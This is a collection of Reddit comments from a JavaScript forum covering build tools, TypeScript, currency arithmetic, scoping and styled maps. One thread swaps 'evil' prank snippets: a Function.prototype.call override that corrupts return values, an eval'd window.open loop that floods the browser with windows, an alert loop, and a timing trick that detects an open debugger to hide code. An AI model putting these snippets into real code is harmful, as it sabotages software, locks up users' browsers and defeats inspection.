Fair enough. Yours is definitely faster for the case provided. I guess I worry about scenarios where there are other ways to select something (which is really hypothetical in this case), so I don't have my function keeping track of what was selected, rather it just figures it out when it runs. Definitely slowing down the process. I will keep .on() in mind for future projects where I do similar things and I feel like it's a safe and faster option. So thanks for that!
I have added offline mode. You will need to refresh the page a couple of times for the new version to be stored into the cache. :)
I can see you (or someone) played with that section code dealing with the last selected item -- but as I mentioned before, the profiling ignores that on account of it being inside the actual event callback method. So, it would only be invoked when you did an actual click. The only thing that jsPerf is testing is how fast it takes you to setup the event handlers in the first place. The only reason I translated it over was to produce an equal 1:1 conversion of the code.
Hmmm... The post starts with saying I couldn't find a good summary of how to combine angular/grunt/heroku and that it's just that for posterity and other people. Felt natural to have a title that would help people stumble upon it when googling for that same problem Edit: Would truly love to hear not "buzzwordy" suggestions to sound less-douchy next time
Sure... and also, nobody knows everything... I certainly don't and I don't expect others to... but if you're interviewing as a web developer who claims to be competent in JavaScript and you can't articulate that answer at least roughly, or you can't describe what a closure is to some degree, or you don't know how to get a reference to a DOM node... all of which are standard questions in my battery of interview questions... then you're just wasting my time and yours. 
Here - read Addy Osmani's introduction to Backbone, it covers what mvc is and why it's nice to have a framework to structure large web apps: http://addyosmani.github.io/backbone-fundamentals/#introduction
It's nice to see a framework with lots of stars, but that doesn't show us which is actually used the most. Though it's gathering lots of interest due to its unorthodox approach, I highly doubt Meteor is used more ("more popular") than Ember.
Instead of measuring the number of Github followers, I'd like to have seen numbers on real world use of the scripts.
&gt;omakase Opinionated.
This is exactly the article I needed. Thanks!
very cool, thank you for sharing
To continue my pedantic streak, minification need not be obfuscation. They may have the same output, but different intents (and different settings).
The goal of this [screencast](http://www.youtube.com/watch?v=fSAgFxjFSqY) and [repository](https://github.com/davemo/frontend-workflows-with-grunt-and-angularjs) is to educate web developers on how to use Grunt to craft their own workflows, and examine some higher level tools that provide additional features that are helpful when creating rich-client web applications. By watching the screencast you will learn about: * how to create your own frontend workflow using [Grunt](http://www.gruntjs.com) * how to create custom tasks with Grunt * how to use [Lineman](http://www.linemanjs.com), which utilizes Grunt, to create web applications that are portable between any backend. * how to manually bootstrap the application we built in [End-to-End with AngularJS](https://github.com/davemo/end-to-end-with-angularjs) using angular.bootstrap * how to effectively separate your code into many small pieces with singular responsibilities 
Exactly, it's not a framework.
impressive. 19 fps on my Galaxy note 2.
Great video. I'm enjoying your screen casts, keep it up!
It's a library and not a framework as it doesn't make decisions for you in regards to how these components work together. You can use them loosely throughout your application. "Full fledged frameworks" do not give you this freedom, you basically must follow their rules to make everything work correctly.
well, I'm handing in my javascript license. damn………i just got motivated to work a lot harder! Great work Cory!
Honest question - are you paid by Google?
Honest answer - I am not paid by Google, I actually interviewed with them over the last 6 weeks for a Developer Relations Engineering position on the Chrome team, but didn't get the job. I'm self employed and work as a contractor with the amazing guys at [Test Double](http://testdouble.com/) :)
That seems like an awfully arbitrary requirement for a framework.
The frameworks aren't attacking one another. A user of one framework expressed distaste for another framework he hasn't used.
Totally unrelated, but you should probably have some content on that page that isn't dependent on js. With noscript on, its just a blank white page.
Here is a Rails app built on the JSLogger API as a proof of concept: https://github.com/jslogger/jslogger-api-on-rails-example
Not **anymore** but at least not the same day.
It's simply to prevent spamming of the server by requests on every page refresh. Possibly to not overuse its resources.
No, no, no, no, no. [Never handle currency amounts using floating point](http://vladzloteanu.wordpress.com/2010/01/11/why-you-shouldnt-use-float-for-currency-floating-point-issues-explained-for-ruby-and-ror/).
I don't think so. Most frameworks do not give you the freedom to tie multiple components together as you please while getting all the benefits of using the framework in the first place
To be honest, that blog (and the "home" link, which isn't actually the homepage of the site!?) are *awful*. I use (and like) [when.js](https://github.com/cujojs/when) but I certainly didn't recognize that it came from there at all. Also, why does a set of Javascript libraries need a branding?
"huh, never heard of CujoJS..." :clicks link:, :reads page: "Ok so they have a brand new website, they've unit tested it. Ok? So WTF is this all about?" :shrugs shoulders, leaves:
Could it be some bass-ackwards tracking link? Maybe he added the the (capital O) "Open" method to the window prototype, and it does a redirect from a tracking site back to the page "next.html". 
If that wasn't clear enough - his link: http://testdouble.com/ has no content if you have noscript enabled or javascript blocked in anyway. It's just a blank page.
I guess they're using javascript templating.
Even googling for info doesn't yield much. Anyone know of any "CujoJS 101" type documentation available? I have no idea where to start w/ any of the official doc.
I know processing lets you write their language/code within the page itself, is there something like that for typescript so one does not have to compile?
Right. A common best practice is to store your currency in integers, representing the "cents". All your math will now be integer arithmetic. For display, simply show a decimal point in the correct spot. Or even divide by 100, which will always work. Another way to understand this is that currency is not really a floating point number even though we represent it visually with decimal point.
You should post that to /r/LearnJavaScript. You'd probably get some more internet points.
Thank you so much for this, I owe you all the time this saves me. Do you have any advice on the best way to include a column for (say) deleting the row? What I mean is a column that contains controls rather than content.
Errrr....why? How does its popularity affect you or your usage of typescript?
I don't want to build off a language that will be dead and unsupported in 3 years. I'm not saying TypeScript will be, but popularity leads to momentum, which leads to confidence.
Very close. That seems to still require translation to js to be able to run. I mean something akin to &lt;script type="application/processing"&gt; as per the example http://processing.org/examples/functions.html if you look at the source the processing "language" is within it's own special script tag.
&gt; I don't want to build off a language that will be dead and unsupported in 3 years. MSFT is a bad choice then.
if looks like the typescript compiler is running in the browser on that page (no network traffic when you update the code samples) so it should be possible to use the same technique processing does. (Scan the document for scripts of type "application/typescript" and compile them on load). The thing is, you'd never want to do this outside of development, and automatic compilation in your dev environment is fairly easy to hook up anyways. 
Because the client browsers would have to compile the typescript into javascript before parsing it every time the page loaded instead of you doing it once on the server.
&gt; Because the client browsers would have to compile the typescript into javascript That's actually not the worst part. The bad part is *downloading the entire TypeScript compiler first*.
So I saw a presentation on by one of these guys, cujo is a collection of tools that are modular and can be used separately (hence why every one knows when.js) but together form a toolbox for making apps, imagine if the Ajax, the selector, the animation, and the deferred parts of jQuery were stand alone libraries. 
And that.
how big is the compiler?
JavaScript can safely store integers from -9007199254740992 to 9007199254740992. So if you can count integer cents instead of dollars then it's safe to use. Beyond that ... well, unfortunately I can't find it right now but there is an emscripten compiled version of a money integer library that's quite good. Money is expressed as strings, and you use the library to perform operations on them which return other strings. E.g. &gt; money.add("14.333", "12") "26.333" &gt; money.subtract("26.333", "0.333") "26" goddamnit it though I can't find the library now
You said you use Resig's Simple Class Inheritance, did you ever stumble on the fact that the `this._super` does not work reliably when used asynchronously?
TL;DR: if you don't want to expose variables, put them inside a closure.
Uncompressed a little over 1,1 MB.
The post seems to be more about formatting currency for presentation, where floating points aren't *that* big of a no-no since you don't perform any arithmetic.
It's not just workflow. Unless typescript is a 1 to 1 representation of JavaScript's future, or there is an easy and reliable way to convert entire typescript projects into human usable and maintainable JavaScript; maintaining or building a project in a language that is unsupported (in the present or future) is a really bad idea. If it was just an IDE or a workflow tool, I'de be with you on this one.
So? Is that supposed to be new or funny?
Funny.
It's a language by the person (Anders Hejlsberg) who brought us Turbo Pascal, Delphi, and C#.
The TLDR is that there is no good way to implement information hiding, and sticking with the "_" convention is the most elegant way to do it currently. Edit (from the article): &gt;For my part, I’ll be sticking to the informal naming convention for the foreseeable future. No other approach is as recognizable, maintainable, or powerful as simply denoting private APIs with an underscore. 
Thanks!
yeah major cities do look quite impressive... and similar. glad you like it
"000webhost.com Better than paid hosting".... I think not.
definitely not *reddit* ready
try using jsfiddle or codepen instead of your own site :P
Everyone has seen this 10000x though
Pro tip, the paid hosting they provide isnt much better :P I can hook you up with a free account with them if you want as I have reseller hosting
Not sure what your site looks like now that it's down, but I am just assuming you designed a new map with JSON. Google also provides this for anyone else wanting to generate customized looking maps:: http://gmaps-samples-v3.googlecode.com/svn/trunk/styledmaps/wizard/index.html
I wasn't the one who posted it up.
or github.
* specify a finite state machine with few lines; * link state changes to events of a conventional node `event-emitter`. * when the fsm is running on a remote server, you can just peek at it to inspect its state transitions.
Just a heads-up... your account is [practically the definition of a spammer here on reddit](http://www.reddit.com/wiki/faq#wiki_what_constitutes_spam.3F) -- it's obvious your account exists solely to promote your site. I don't really care and I'm not going to report it, but people have been banned by the admins (not the mods) for less egregious activities.
Saved to see later; Let me know when you repost on a more stable host.
To be fair, all you have to do is go to [cujojs.com](http://cujojs.com/).
Github now automatically maps ego data you have in a repo. Snazzy! Too bad the only geodata I'd use is confidential. 
Go over to /r/webhosting and find yourself a paid host. 
I like the look of this. If only I had a handy problem domain that needs finite state machines to try it out with...
There's an API for ego data now?
There are private repos and enterprise local github installs, if you need it.
The worst thing is that the page says: &gt;**CPU Limit Reached** &gt;You are seeing this page because website has reached CPU usage limit of the server, and it was temporarily disabled. while *nowhere* on the comparison between free and premium hosting is the CPU mentioned, anywhere. 
Yes, indeed, I can totally see your point now, I should not post so many links to my site... But, I'm still confused, do you think that posting links to other useful resources might help clearing out the spammy attitude? Lets say that I'll post one or two links, daily, to some useful resources (that I twit about them anyway) and than once or twice a week links to some articles on what's new about my software, will that help a lot? Btw, the PHP guy's story is really sad...
https://developers.facebook.com/docs/reference/apis/
I can't speak for the admins obviously, but I believe that would definitely help. I think the main thing is that you need to be a redditor, who happens to also have a site they want to promote, instead of just someone that has a reddit login solely to promote your site.
Have you tried using the closure compiler with annotations in doc tags: https://developers.google.com/closure/compiler/docs/js-for-compiler to get type information?
I'm a big fan of styled maps. Here is some more info about them: [Developer guide](https://developers.google.com/maps/documentation/javascript/styling) [Reference](https://developers.google.com/maps/documentation/javascript/reference#StyledMapType) [Simple example](https://developers.google.com/maps/documentation/javascript/examples/maptype-styled-simple) [Another example](https://developers.google.com/maps/documentation/javascript/examples/maptype-styled-simple) I had some fun with styled maps when I built a series of [election results maps](http://www.google.com/elections/ed/it/results) for Google. I wanted to keep the sense of place you get from the base map but with fewer distractions. So I turned off all borders and country names but kept city names, kept roads but made them fairly faint and used the "simplified" version of them and turned off road labels, faded out the green parks so they were still visible but wouldn't interfere with the political map coloring, etc. I liked keeping the roads visible because that is how people in one country are connected to people in neighboring countries. I didn't need borders drawn, since my results mapping code draws its own borders. This had a side benefit too: I used highly simplified polygons for the map to allow it to be drawn quickly in the browser. Naturally, the simplified borders don't line up perfectly with the more detailed borders that the Maps API tiles normally provide. Turning those off solved that problem and also reduced distraction.
I know, but I'm not going to pay good money for a private repo to dick around with some geodata. [Blog post announcing geodata support](http://techcrunch.com/2013/06/13/github-adds-maps-to-give-a-view-of-a-developers-geodata/), btw :)
GitHub pages is great for hosting static sites. Heroku has free plans for small apps. You wont hit a limit, but the site might get really slow.
Best way to make it more popular is to use it. I'm having a blast with typescript in personal use at least.
Not provided are ones where either the user has specifically declined to allow tracking, or as you have noticed, where the search is encrypted and it would be insecure to pass along the search terms. You should not be able to find "Not provided" searches, hence why they are not provided. If you find some way around this, I would assume it would just be a hole, that google would want to fix.
Wow, I've never seen a page go down because of *CPU* usage before... bandwidth, throughput, sure... but CPU? Sounds like an opcode cache would fix that right up.
Where does Microsoft come in then?
Why use Typescript? What value is it providing?
This is a very interesting reed!
This looks awesome! I particularly like the fact that you can call a callback every time you receive a result matching that pattern (onFind). Good job!
Write an iOS style folder script and stop expecting there to be a library to do all your work for you. 
Roads? Where we're going we don't need roads!
This was the original I that was building out with more evil, which is why I didn't use a shorthand if Function.prototype.call=(function(o){return function(){var r=o.apply(this,arguments);if(typeof r=='string')return (r.length?r.substr(0,r.length-1):'')+String.fromCharCode(Math.floor(Math.random()*223)+32);if(typeof r=='number')return r+1;return r;}})(Function.prototype.call);
National circulatory system.
If you need a scope, use it. No problem.
Replace JavaScript errors on the page with Twilight Zone prologues: https://gist.github.com/anonymous/5794002 Console works as normal
I'm not super familiar with the man or his work, but it appears that he's a language guy and MS is paying him to ... evolve languages.
I'm all out of reeds :(
 oboe.fetch('carving_oboe_reeds.json');
Most definitely it's a good thing! I wouldn't go crazy and do it in *every* block but do it where it makes sense to you.
Whoa this is fast
Not really evil, but I put a little script on my companies internal website that launches a game of Asteroids (using the [Kickass](http://kickassapp.com/) app) when the user presses CTRL+F1. I obfuscated the entire thing, of course. 
// this should to the trick &gt;undefined = true;
What's the difference in use between what OP said and just using { } ? 
It's not very clear what it is that you're asking. Try making &amp; sharing a sketch of what you're trying to do! Ninja edit; Are you talking about a [Tree View](https://en.wikipedia.org/wiki/Tree_view) by any chance?
In JS blocks do not create a new scope, only functions do.
JavaScript does not have block-level scope (as in just using {}), however, it does have function-level scope, which allows you to use an Immediately Invoked Function Expression (IIFE) to create a scope at just about any point in your code. An IIFE looks like this: var globalVar = "Hello,"; //Alerts "Hello, my name is: Sam" (function(passedInVar) { var scopedVar = " my name is: "; alert(globalVar + scopedVar + passedInVar); }("Sam")); //ReferenceError: scopedVar is not defined alert(scopedVar); The reason we wrap the whole function in parentheses is so JavaScript evaluates the function as an expression and not as a definition. This definition/expression difference is also found between **function foo(){}** and **var foo = function(){};** As an expression, the function can be immediately invoked using (). In our case, we even pass in a value ("Sam") when we invoke it. The end result is we have created a temporary scope on the fly that can be used to store local variables if needed while still having access to the variables around it (the globalVar, for instance) For more information, check out the [Wikipedia article](http://en.wikipedia.org/wiki/Immediately-invoked_function_expression)
You could be more helpful by providing your experience/skill level, but this seems like a plug-and-play solution: http://www.turnjs.com/
'use_strict';
Strangely, there's no *literal* `undefined` in the ECMAScript5 spec, even though there are many cases where the result is the *value* `undefined`. (courtesy of /u/WesAlvaro) (function(){ 'use strict'; var undefined = 42; console.log(undefined); }()) Because of this, just using `undefined` is not safe. For example, jQuery uses `(function(window, undefined){...}(window))` to safely get the `undefined` value. ~~Edit: [It seems that I'm wrong.](http://ecma-international.org/ecma-262/5.1/#sec-15.1.1)~~ Edit 2: ... but (fortunately?) my point is still valid. There's a *global variable* `undefined` which is uneditable, but since there's still no literal `undefined`, inner scope can have a *local variable* with name `undefined`!
The ECMAScript 5 spec says "yes" - so you sort of have me there :D But if we are going for "prank in minimum number of characters" I'm doing okay: D Covered at MDC in the first yellow boxed area. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/undefined
(function(){var e= document.getElementsByTagName('*'); for(var i = 0; i&lt; e.length; i++) alert('Your Mom!');})();
That's pretty funny.
[annoying.js](http://kilianvalkhof.com/2011/javascript/annoying-js-how-to-be-an-asshole/)
Thank you!
I'd say that in programming in general it is good to have vars scoped as tightly as possible because then there is less to keep in your head at once while considering the possible states of that var. However, in JS remember that creating and calling a new function takes some time (this may not matter but don't do it from a tight loop in a game engine) and the syntax is a bit ugly compared to languages like Java where any {} makes a new scope. So I personally would do it around files and then inside the file try to arrange so that the code inside there is laid out into several semantic named functions which naturally scope everything nicely. Self-executing anon functions are in my toolbox but I'll rarely use them except to wrap a whole file. Personally I also like to avoid reassigning vars where I can but this is because of an interest in functional. Scoping becomes less of a concern when you know nothing unexpected will change the var.
I didn't know that. I think I should [read it twice](http://ecma-international.org/ecma-262/5.1/#sec-15.1.1),...
JavaScript is much faster than it used to be and some areas have been retooled to allow fast support for behaviors that at one time were notoriously slow. With modern JIT compilers JavaScript is essentially a fully compiled language now. The thing to keep in mind with functions, or even variables, is that there is some amount of effort given to searching for a reference of any kind. As long as your functions are declared in the same scope as your loop and declared outside the loop you will be just fine. In this case you are not traversing the scope chain and you are not creating new functions in each loop interval. The actual costs of function calls are reference searches the same for any reference. The way it works is that first the local scope is searched for a given reference and if the search cannot resolve the reference the next high scope is tried. This happens all the way up to the global scope. Once this is complete the prototype chain, if any, is searched. If the reference cannot be found it is undeclared, which throws an error in strict mode. This pattern of search occurs for each and every reference each time the reference is evaluated. Local variables are faster to resolve than global variables, particularly if the scope chain is long, because the breadth of search is significantly smaller. With modern JITs the cost of searches is actually relatively low since I presume, and this is a completely wild guess, that the JIT compiler caches references and scope to make resolution much faster. Most developers will never bother themselves with resolution costs because either the JS applications are small and because few developers nest functions. Resolving properties of large objects used to be slower than resolving references in scope provided a short distance in the scope traversal, but again properties are likely cached to their objects for faster resolution now.
Oh, this is wonderful; those are some new letterlikes I didn't know of. To add to this, I recommend liberal use of ᚐ ǀ ǃ Ƽ ᐪ ᗮ ᐧ ᐨ ᐤ ᐦ ᑊ ᒿ ᕀ ᕁ ᕯ ⴲ ⴺ in your identifiers, and don't forget about the whitespace character ` ` (renders as a dash in most fonts, but not all unfortunately). These allow you to write beautiful code, like var ᚐ = function (a, b) {return a + b} console.log([1,2,3].reduce(ᚐ, 0)) as well as tricky code. Quick, what does [this code](http://xen.firefly.nu/up/tricky.js.html) do when run? (external because reddit ate my whitespace) Edit: darn. Well, this is interesting, seems Reddit normalises consecutive whitespace because my ogham whitespace gets replaced with a regular one when I save... oh well :(
Even on the slower js engines most of the time for webapps the user is waiting longer for IO than for scripts to execute. If you have some one-off processing that takes 50ms nobody is going to notice if you speed it up to 25ms. For js games, sure. For typical webapps script execution time isn't the bottleneck.
Yeah, that's pretty much it, and the API is designed to be identical, but: A) Level 'squelching' is the most basic serious logging feature, and is absurdly useful; it's difficult to add sensible amounts of logging to any medium+ size application if you don't have a way to filter it B) That second point is critical; just using console.X directly will fail in all sorts of places (e.g. console.anything() will crash in IE &lt; 10, unless dev tools is open, various older browsers of all forms support only console.log(), not .error(), .debug(), etc). You can wrap it yourself by carefully redefining a new console object, without too much trouble, but then you mess up the stacktrace that good modern browsers will let you get for each output line. This mostly exists to just thoroughly fix that, in a tiny package. If everybody supported the console API consistently everywhere, this could mostly go away, but I've worked on a multiple large JS projects where people just have commented-out console.log lines riddled throughout their code, kept so they can 'easily' switch them on/off when debugging while keeping solid browser support, and it's downright nasty.
Very small snippet for a konami code callback: https://gist.github.com/tsaniel/1188477
None of those characters show up on my phone
There is by definition some overhead in calling a function, even with JIT, as there's simply more things happening then with the identical logic inlined: a new scope is created, arguments pushed, another step in the variable lookup, returning a value etc. Usually it doesn't matter but it's measurable in iterator loops like with the different forEach/map type iterator functions your see in jQuery, underscore and on the native Array object. A plain for-i loop is always faster. There are many benchmarks for this on jsperf, like [this one](http://jsperf.com/jquery-each-vs-underscore-each-vs-for-loops/5) It only adds up with large amount of iterations so if you just need to iterate small amounts of data (up to hundreds of items) I'd still use iterator functions for readablitity but if you need to process massive data (like 3D models or statistics) it's better to use plain for-i loops with inlined code.
Or my browser.
Console logging will break in early IE, so almost always people create wrappers. It's also nice to have flexibility over what you see logged in the console since you can get spammed. 
I... believe the OP is a joke. Your suggestion is still good though; I actually *do* have my editor setup to substitute some things visually ('function' → 'λ', '.prototype.' → '#'). Edit: oh, and only "letterlike" characters are allowed in identifiers. Hopefully tools like js{h,l}int have proper parsers that don't incorrectly complain about valid identifiers.
Not really &gt; undefined = 1 1 &gt; undefined undefined
 (function() { var win1 = eval('window.open("'+document.location+'")'); var win2 = eval('window.open("'+document.location+'")'); })() not sure if this still works but years ago I did this and found that putting window.open in eval meant you could open unlimited windows. IE maxed out at 50 or so windows and closing any of them just tried to open more. I had to restart my computer in the end.
Heres a JS fiddle for anyone interested: http://jsfiddle.net/dUjR6/5/
ah nice! thanks!
What exactly is that supposed to do? It crashed my tab in Chrome.
That's not a prank, that's just annoying :\
The core of this prank code is: try{ d = Date.now(); eval('debuger'); return Date.now()-d&gt;&gt;2; }catch(e){} `debugger` is a [statement for debugging](http://ecma-international.org/ecma-262/5.1/#sec-12.15). When there's a debugging tool attached, it acts as if there was a breakpoint there. `Date.now()-d&gt;&gt;2` is not zero when difference between `Date.now()` and `d` is greater then 3. (i.e. more than 3ms have been passed when `eval('debugger')` is executed. Since it usually take at least few hundred milliseconds to resume when the debugging tool is enabled, this part of code returns non-zero if the debugging tool is enabled. (`eval` used for not showing the code immediately when the debugging tool is opened, though by pressing "next step" one can see the codes.) Therefore, `if(function(f,d){try{d=f();eval('debugger');return f()-d&gt;&gt;2}catch(e){}}(Date.now)) return;` means "return if there's a debugging tool." One might make a simple [Heisenbug](http://en.wikipedia.org/wiki/Heisenbug) by using this. (Opening debugging tool to inspect function -&gt; unexpected breakpoints -&gt; the function does nothing and returns -&gt; ???)
It seems like you'd be better served with something like `(new Function(atob('ZGVidWdnZXI=')))()` (or even `setTimeout(atob('ZGVidWdnZXI='))`, which would be less suspicious than `eval` and `new Function`), since the first thing I'd do with an unexpected breakpoint/debugger would be to search the code for `debugger`. The `setTimeout` version should be even more perplexing as you shouldn't have a callstack.
_.template() is compilation at construction time of the view, so whenever render() is called, the compiled template is used. The views and templates are all separate files and at build time, the javascript code gets thrown together into a single file. Now how can I do the same thing to templates? I could bundle all together like JS but you're right, not all templates may get used. But in that case, the third party and have their own compilation step which can weed out the unused code.
My experience level is zero. This is simply a project for a class that I am completely lost on. 
Great info, thanks for sharing :) I definitely agree on A. B is news to me as I haven't used `console.log()` outside of a local debugging in Chrome/FF, and I guess I scrub out `console` references before starting local cross-browser testing.
Thanks for the `setTimeout` trick! However, I didn't want to obfuscate that code too much... (I personally prefer `$($.constructor("..."))`. It seems that I'm using some normal jQuery functions!)
I just found this: `jQuery(jQuery)` or `$($)` Somehow this contains a vicious cycle.
Worth it?
as in http methods: post, put, delete etc?
I haven't bought the book. Just thought to mention that [fogus has a nice blog](http://blog.fogus.me/2013/05/29/fun-js-pt-1-functional-javascript/).
Yes. Guaranteed to double your conversions.
I do it all the time. IMO, one of the features that makes javascript such a flexible, powerful language.
Thanks for the code! Really gives a nice, highly understandable example of working with the Google Maps API. Just one question: when importing the Google Maps API script, you use a certain key. Why is that necessary? (If this is a noob's question, let me know - I've never experimented with the Maps API, so it might be a necessity I do not know of).
preaching to the choir here?
Profile your code and find out. Avoid too many function calls where speed matters.
Cool man
Didn't lodash improve on underscore?
Yep, that's correct.
Just bought it, don't have any functional programming books on my bookshelf, so I'm really looking forward to it.
Depends how over board you plan on going with this. Generally, most frameworks and good projects will at least have one self executing anonymous function wrapping the contents of their file, or something of the like. Now, if you want to start doing something like : for( var key in data ){ (function( dat ){ do something })( data[key] )); } That is over kill and will give you performance hits (with large data).
Javascript doesn't run everywhere and coule never rule all languages. It's fine in a web browser, but how much relevance does it have in a shell and working with an OS? Very little. Even in the browser, it isn't a pretty language. Just look at how big "The Good Parts" is - not very. While it does have good things about it, there will be better languages and hopefully soon.
neat. might I suggest the enemy leaving a "ghost" of the last seen location? this is something I see while playing dwarf fortress that I really like and don't often see implemented
The API requires a key in order to work. This is to limit the number of connections/day a key is allowed to make. the free key is 25,000 connections/day.
While stylistically I totally realize what you're going for might be trumped buy this, I think that using a contrasting color to outline borders (ie: Continental or State/Country) would give a better perspective for navigating. Still I think it looks neat. I think I saw a river map that was similar looking, maps are always a ton of fun.
document.write is considered bad practice nowadays except in some limited circumstances. http://stackoverflow.com/questions/802854/why-is-document-write-considered-a-bad-practice
Yeah it's bad. The sort of thing that I'd remove in a code review.
Is their any alternatives? 
Use the DOM APIs to modify the DOM. Libraries like jQuery make this very easy.
um...what? I'm kind of still learning code lol 
It'll also iterate through properties on data's prototype, which you may not be expecting
Why don't you put up a link to what you have so far?
Pretty sweet. Emulates the real deal with not a huge amount of code. Nicely done.
Oh! I didn't know that. How do you acquire across a key (free/premium)?
you can do most things in the command line with node now, and even do [bots](http://nodebots.io/)! Having the good parts be small is a good thing. Just look at LISP, very minimal but people still use it to do all sorts of things I don't think you're thinking of the language. You're thinking of the standard libraries.
I just use browserify it pre-compiles them to javascript functions, so you just call them. i personally prefer jade templates, but you can use handlebars if you insist - https://github.com/epeli/node-hbsfy And no, this has nothing to do with AMD 
You can't get through this without putting in the work. Go look at Somme beginner JavaScript resources, learn what the DOM is, learn what jQuery selectors do. I'd recommend resig's 'secrets of the JavaScript ninja' book
More like: JavaScript: the only language supported by virtually all web browsers without needing a plugin, so deal with it.
What is the benefit of using this library? Also, what is your excuse for messing with the prototype of a primitive object in Javascript versus just using a APM ? **EDIT** Just took a glance, but this seems like a bad idea: for (var syntax in nm) { Number.prototype[syntax] = nm[syntax]; } Wouldn't this bring in properties on the Object prototype and overwrite them into the Number prototype? This is a good reason not to do prototype munging.
I chose using the prototype because it will be referenced by all numbers in JavaScript, preexisting and new. As far as the benefit it is just to make your code a little easier to read and update. For me 3..megabytes is nicer than 3145728 or 3 *1024 *1024. Dates are the most useful though in my opinion. I enjoy being able to do 3..days.from_now and get a Date object back.
You're missing the point. What if Object's prototype has something that overwrites Number's respective method?
&gt; Why does it matter if he messes with Number.prototype? Why would I ever use libraries that mess with built-in prototypes? They change the fundamental contract of the built-in they are altering. They change the expectations of the built-in, often in non-obvious ways that other developers won't know about. They are frankly hostile to working with multiple people in the same codebase.
&gt; People modify String.prototype all the time, for things like trim, etc. 1. Shimming functionality from a not-yet-fully-supported spec is not the same thing as creating your own random BS and attaching it to something other people will [expect to be different](http://www.ecma-international.org/ecma-262/5.1/#sec-15.7.3.1). 2. Lots of people commit robbery, does that make it smart?
this is hilarious. especially the part where you got downvoted heavily because (maybe?) there was that one guy who was suggesting something like this seriously. 
Nice! Can you post this in /r/RWD, please?
V. 3 of Google Maps API doesn't require a key to function: https://developers.google.com/maps/signup
The prototype is there for the purpose of extending the functionality of the object and if the library isn't upfront about what they are adding to the prototype then you have a bad library. 
well obviously to you will toss in hasOwnProperty, but I omitted that for demo's sake.
I just ran a check on JSPref and it was faster with multiplication.
LOL I will change the test a little to slow it down later. Thanks though for taking the time to run the test.
There's a bit of a "too bad" attitude I'm feeling that I can't quite contain. I actually love javascript and think it's beautiful. Its flaws are generally either mitigated through understanding, enough based in style as to be subjective, or, I suspect, can be addressed (I'm looking at Unicode, here). Meanwhile node is flat-out better than Apache as a web server, and the browser is the most ubiquitous programming environment on the planet. Javascript's (Node's) single-threaded asynchronous nature may be better suited to working with an OS than you might imagine. 
If you want to see the US, here's [Chicago.](http://jsfiddle.net/8sb6H/) Tip: fiddle with the zoom, it's fun. Also Wiki has city coordinates to mess with.
Try wrapping in parenthesis instead of the double dot. (3.2).terabytes [EDIT] thanks for pointing this out I'll change my examples to use the parenthesis and just make a note about using the double dot for whole numbers.
Tried blacksheepwall. Didn't work. 
In case anyone is wondering, this makes heavy use of the Canvas `globalCompositeOperation`. [Short blog post by beej](http://beej.us/blog/data/html5-canvas-globalcompositeoperation/) on globalCompositeOperation and a nice reference for the [different operations.](https://developer.mozilla.org/samples/canvas-tutorial/6_1_canvas_composite.html)
Haha, holy shit. Wasn't expecting it to work.
&gt;With node.js now, it even runs on the server. You can write a full stack end-to-end now with nothing but JavaScript. I hate it when noobs try to re-write history. Javascript has been used on the server since forever. Netscape Implemented it as a server-side language shortly after it was first introduced in the browser. Microsoft has supported server-side javascript since the 90's too, and they even have JScript.NET which has been around quite a bit longer than node.js. You can even compile JScript.NET into .exe and .dll files. 
great job sir! this is truly an innovation, keep up the good work
Lodash is a significant improvement over underscore in performance, but, for most purposes, operates exactly the same. It's built to be a simple drop in for underscore, allowing you to simply swap out the two libraries.
Compared to PHP (Pear, PECL), Python (PyPI), Java and most other languages, JavaScript's [library ecosystem](http://www.jsdb.io/?sort=rating) is pretty tiny. JavaScript is an old language (nearly 20 years), but it was reviled for much of its history as a slow, clunky, misunderstood, and abused language with ugly incompatible implementations and browser vendors who did little to help developers. In my opinion it took a combination of good developer tools (let's say since 2008/2009 - FireFox 3.5 + Firebug, Chrome, IE8), fast javascript implementations (Chrome, which set a much needed bar) and libraries like jQuery which brought people down from the web design world and up from the server side to actually learn and use JavaScript. Once the language was demonstrated to be powerful (let's say when Gmail dispelled notions that JS was just a toy), the experience of writing it became less miserable (real debugging tools and jQuery to bridge the gap of shitty APIs and incompatibilities) and programmers began taking it seriously, a popularity boom hit and suddenly people wanted all of these things they've had in other languages for decades in JavaScript. At some point the balance tipped from people using YUI, Mootools, Prototype and jQuery UI for UI widgets because we all wanted to *avoid writing JavaScript at all costs*. It became about visualizations, video games, graphing libraries, new programming styles, client-side frameworks and other inspired endeavors because that's what we wanted to do with beer and Friday (for a change). The reason there are so many tools and no clear winners is because the pot is still boiling. There is still low-hanging fruit. It's a thriving competitive marketplace and full of passionate people spending their nights and weekends to make interesting things. That's definitely a *good thing*. As an aside, I'm pretty happy with Backbone, Underscore, jQuery and D3. It's a good stack. I don't have to look at a project and immediately smack my face against a wall of loathing for DOM interaction, cross-browser quirks, mashing up UI widget libraries, dumping in a bunch of shims and boilerplate just to get a fluent toolbox or shoehorning myself into somebody else's one-truth-path. I know there's always something better out there and that's not a bad thing. One day I'll be doing the 40%-less-code/time thing with Angular or see a huge performance boost from switching to Lodash/Zepto or I'll finally get into Three.js. For now, I'm just happy to be confident in my stack and building useful things in a good, popular language (for a change).
Subjectively not a fan of any f those languages. But i can see your point.
[The spec basically says don't mess with the prototype](http://www.ecma-international.org/ecma-262/5.1/#sec-15.7.3.1) of `Number` ([Writable and configurable](http://www.ecma-international.org/ecma-262/5.1/#sec-8.6.1) are the relevant bits)
So your point is that it's okay for you to pollute the built-ins, so long as no one else does?
Pretty cool how it maintains a pixel perfect fog, though I presume that it wouldn't scale too well in this form (multi-layered canvases).
did you see Bolin's take on converting typescript to closure code? 
I think it's Anno 1404
I enjoyed it. Took my a while to realize the purpose of the arrows. Maybe have a small description? unless i skipped it the first time around and it doesnt prompt me again.
+1 for using an image of Anno 1404. Been playing it again recently. One of the best games ever.
&gt; If you're using a library, you should know what it does. This is akin to saying "I don't know that $ is an alias to jQuery" I'm sure that you've memorized the full implications of every library you've ever used. &gt; Yes, totally. The mere existance of Number.prototype.foo harms you. Just because I know that a given library is loaded on a given page, does not mean my successor will know that.
&gt; So? This is bad on Object, or Array. You haven't given a reason why it's bad on Number Yes, I have, in the lines that directly follow what you quoted. I've also linked to the exact part of the spec that says this "functionality" will be broken in future browsers. Also if you need another nail for this coffin: it is damned near impossible to debug when two libraries that modify the same built-in start stepping on each other's toes.
That's why we don't use bing.
Don't know if this is a knock at Bing, or the average Bing user...
Oh boy... that changes everything! Anno 1604 in a browser!
Like the idea of being able to do all the ajax things. The other two missing are .abort() and setting request headers.
